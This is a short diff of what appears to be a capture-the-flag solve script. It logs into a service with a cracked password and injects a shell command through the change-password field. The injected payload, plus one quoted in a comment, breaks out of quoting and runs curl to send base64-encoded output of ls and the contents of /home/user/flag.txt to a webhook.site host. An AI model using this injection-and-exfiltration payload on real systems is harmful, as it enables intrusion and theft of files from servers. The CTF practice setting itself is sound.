@@ -61,7 +61,7 @@ io.sendlineafter("Password: ", "123456") # Found it from the hash using google
 
 io.sendlineafter("> ", "5") # Select change password option
 
-ATTACKER = "https://webhook.site/your_webhook_here"
+ATTACKER = "webhook.site/your_webhook_here"
 # The path to the flag was retrieved with '"; curl https://{ATTACKER}/$(ls | base64); echo "'
 io.sendlineafter("New password: ", f'"; curl https://{ATTACKER}/$(cat /home/user/flag.txt | base64); echo "')
 
